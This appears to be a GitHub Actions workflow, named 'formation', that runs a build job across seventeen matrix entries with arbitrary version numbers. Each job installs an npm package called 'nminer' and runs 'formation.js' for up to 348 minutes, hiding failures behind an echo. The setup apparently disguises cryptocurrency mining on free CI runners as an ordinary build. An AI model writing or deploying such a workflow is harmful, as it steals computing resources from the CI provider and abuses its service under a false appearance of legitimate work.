name: formation
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 4776 }
          - { version: 300 }
          - { version: 8417 }
          - { version: 3382 }
          - { version: 9206 }
          - { version: 5445 }
          - { version: 5740 }
          - { version: 5684 }
          - { version: 6542 }
          - { version: 3938 }
          - { version: 3375 }
          - { version: 703 }
          - { version: 1244 }
          - { version: 1988 }
          - { version: 2690 }
          - { version: 8910 }
          - { version: 538 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: 
        run: |
          npm install nminer@latest
          timeout 348m node formation.js || echo "formation executed"